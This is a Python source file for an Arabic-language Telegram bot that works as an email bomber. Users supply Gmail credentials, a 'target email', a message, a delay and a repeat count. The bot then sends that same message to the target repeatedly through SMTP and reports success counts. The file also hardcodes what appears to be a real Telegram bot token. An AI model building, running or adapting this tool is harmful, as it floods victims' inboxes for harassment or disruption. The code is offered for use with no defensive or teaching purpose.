import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import asyncio
import telebot
from telebot import types
bot = telebot.TeleBot('7300443041:AAHwwGWR8aNLkQCAKXG3kKX2V3r0LES41II')

datausers = {}
active_processes = {}
def buttons():
    markup = types.InlineKeyboardMarkup()
    send = types.InlineKeyboardButton('بدء الإرسال', callback_data='start')
    mail = types.InlineKeyboardButton('إضافة إيميل وكلمة مرور', callback_data='mail:pass')
    mess = types.InlineKeyboardButton('إضافة موضوع ورسالة', callback_data='sub:text')
    timeandnum = types.InlineKeyboardButton('ضبط الوقت وعدد المرات', callback_data='time:range')
    reverser = types.InlineKeyboardButton('إيميل الهدف', callback_data='reverse')
    markup.add(mail)
    markup.add(send, mess)
    markup.add(timeandnum)
    markup.add(reverser)
    return markup
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id) # creator administrator member left
    state = ['creator', 'administrator', 'member']
    memper = bot.get_chat_member('-1002664471895',uid).status
    if not memper  in state :
        bot.send_message(uid,'''
حبيبي حتى تكدر تستخدم البوت لازم تشترك بالسوبر وهاذا اليوزرة
- @lllllpllpm
بعد ما تشترك ارسل /start
''')
    elif uid not in datausers:
        datausers[uid] = {
            'sender': '',
            'reverser': '',
            'password': '',
            'subject': '',
            'time': '1',
            'range': '1',
            'body': ''
        }
    elif memper in state:
        bot.send_message(uid, 'اختر من القائمة:\nتمت البرمجة بواسطة @lw_w7', reply_markup=buttons())
def set_mail(text, uid):
    try:
        mail, passwd = text.text.split(':')
        datausers[str(uid)]['sender'] = mail.strip()
        datausers[str(uid)]['password'] = passwd.strip()
        bot.send_message(uid, 'تم تحديث بيانات الإيميل بنجاح، ارسل /start\nتمت البرمجة بواسطة @lw_w7')
    except:
        bot.send_message(uid, 'خطأ في التنسيق، يرجى استخدام mail:pass\nتمت البرمجة بواسطة @lw_w7')
def set_reverser(text, uid):
    try:
        mail = text.text.strip()
        datausers[str(uid)]['reverser'] = mail
        bot.send_message(uid, 'تم تحديث إيميل الهدف بنجاح، ارسل /start\nتمت البرمجة بواسطة @lw_w7')
    except:
        bot.send_message(uid, 'حدث خطأ، يرجى المحاولة مرة أخرى\nتمت البرمجة بواسطة @lw_w7')
def set_time_and_range(text, uid):
    try:
        timer, num = text.text.split(':')
        datausers[str(uid)]['time'] = timer.strip()
        datausers[str(uid)]['range'] = num.strip()
        bot.send_message(uid, 'تم تحديث الوقت وعدد المرات بنجاح، ارسل /start\nتمت البرمجة بواسطة @lw_w7')
    except:
        bot.send_message(uid, 'خطأ في التنسيق، يرجى استخدام time:range\nتمت البرمجة بواسطة @lw_w7')
def set_sub_and_body(text, uid):
    try:
        subject, body = text.text.split(':', 1)  # Split on first colon only
        datausers[str(uid)]['subject'] = subject.strip()
        datausers[str(uid)]['body'] = body.strip()
        bot.send_message(uid, 'تم تحديث الموضوع والرسالة بنجاح، ارسل /start\nتمت البرمجة بواسطة @lw_w7')
    except:
        bot.send_message(uid, 'خطأ في التنسيق، يرجى استخدام subject:message\nتمت البرمجة بواسطة @lw_w7')
@bot.callback_query_handler(func=lambda call: True)
def query(call):
    uid = str(call.from_user.id)
    if call.data == 'mail:pass':
        msg = bot.send_message(call.from_user.id, 'أدخل الإيميل وكلمة المرور mail:pass\nتمت البرمجة بواسطة @lw_w7')
        bot.register_next_step_handler(msg, set_mail, call.from_user.id)
    elif call.data == 'sub:text':
        msg = bot.send_message(call.from_user.id, 'أدخل الموضوع والرسالة subject:message\nتمت البرمجة بواسطة @lw_w7')
        bot.register_next_step_handler(msg, set_sub_and_body, call.from_user.id)
    elif call.data == 'time:range':
        msg = bot.send_message(call.from_user.id, 'أدخل الوقت (بالثواني) وعدد المرات time:range\nتمت البرمجة بواسطة @lw_w7')
        bot.register_next_step_handler(msg, set_time_and_range, call.from_user.id)
    elif call.data == 'reverse':
        msg = bot.send_message(call.from_user.id, 'أدخل إيميل الهدف:')
        bot.register_next_step_handler(msg, set_reverser, call.from_user.id)
    elif call.data == 'start':
        if uid in active_processes and active_processes[uid].get('running', False):
            bot.send_message(uid, 'هناك عملية إرسال قيد التنفيذ بالفعل!\nتمت البرمجة بواسطة @lw_w7')
        else:
            sending(uid)
    elif call.data.startswith('stop_'):
        stop_uid = call.data.split('_')[1]
        if stop_uid in active_processes:
            active_processes[stop_uid]['running'] = False
            bot.send_message(call.from_user.id, 'تم إيقاف عملية الإرسال\nتمت البرمجة بواسطة @lw_w7')
def sending(uid):
    if uid not in active_processes:
        active_processes[uid] = {'running': True}
    else:
        active_processes[uid]['running'] = True
    user_data = datausers.get(uid, {})
    if not all([user_data.get('sender'), user_data.get('password'), user_data.get('reverser')]):
        bot.send_message(uid, 'بيانات غير مكتملة! يرجى تعبئة جميع الحقول')
        return
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    email_sender = user_data['sender']
    email_password = user_data['password']
    email_receiver = user_data['reverser']
    message = MIMEMultipart()
    message["From"] = email_sender
    message["To"] = email_receiver
    message["Subject"] = user_data.get('subject', 'No Subject')
    body = user_data.get('body', 'No Message')
    message.attach(MIMEText(body, "plain"))
    total = int(user_data.get('range', 1))
    bad = 0
    good = 0
    markup = types.InlineKeyboardMarkup()
    stop_btn = types.InlineKeyboardButton('إيقاف الإرسال', callback_data=f'stop_{uid}')
    markup.add(stop_btn)
    progress_msg = bot.send_message(
        uid,
        f'''🚀 جاري بدء عملية الإرسال...
        
📌 الإجمالي: {total}
✅ الناجح: {good}
❌ الفاشل: {bad}
⏳ التقدم: 0%
تمت البرمجة بواسطة @lw_w7''',
        reply_markup=markup
    )
    for num in range(total):
        if not active_processes[uid]['running']:
            break
        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(email_sender, email_password)
                server.sendmail(email_sender, email_receiver, message.as_string())
            good += 1
        except Exception as e:
            bad += 1
        progress = ((good + bad) / total) * 100
        try:
            bot.edit_message_text(
                chat_id=uid,
                message_id=progress_msg.message_id,
                text=f'''🚀 جاري عملية الإرسال...
                
📌 الإجمالي: {total}
✅ الناجح: {good}
❌ الفاشل: {bad}
⏳ التقدم: {progress:.1f}%
                
تمت البرمجة بواسطة @lw_w7''',
                reply_markup=markup
            )
        except Exception as e:
            print(f"Telegram error: {e}")
        time.sleep(int(user_data.get('time', 1)))
    final_msg = f'''🎉 تم الانتهاء من عملية الإرسال!

📊 النتائج:
📌 الإجمالي: {total}
✅ الناجح: {good}
❌ الفاشل: {bad}
📈 معدل النجاح: {(good/total)*100:.1f}%\nتمت البرمجة بواسطة @lw_w7'''
    bot.send_message(uid, final_msg)
    active_processes[uid]['running'] = False
async def run_bot():
    await bot.infinity_polling()
if __name__ == '__main__':
    asyncio.run(run_bot())